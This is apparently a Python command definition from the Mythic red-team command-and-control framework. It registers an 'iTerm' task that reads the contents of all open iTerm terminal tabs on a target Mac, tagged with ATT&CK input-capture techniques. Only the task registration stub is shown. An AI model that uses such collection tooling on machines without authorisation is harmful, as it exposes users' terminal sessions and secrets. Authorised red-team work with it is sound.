from CommandBase import *
import json
from MythicResponseRPC import *


class ITermArguments(TaskArguments):
    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {}

    async def parse_arguments(self):
        pass


class ITermCommand(CommandBase):
    cmd = "iTerm"
    needs_admin = False
    help_cmd = "iTerm"
    description = "Read the contents of all open iTerm tabs if iTerms is open, otherwise just inform the operator that it's not currently running"
    version = 1
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_remove_file = False
    is_upload_file = False
    author = "@its_a_feature_"
    attackmapping = ["T1139", "T1056"]
    argument_class = ITermArguments

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        resp = await MythicResponseRPC(task).register_artifact(
            artifact_instance="Target Application of iTerm",
            artifact_type="AppleEvent Sent",
        )
        return task

    async def process_response(self, response: AgentResponse):
        pass
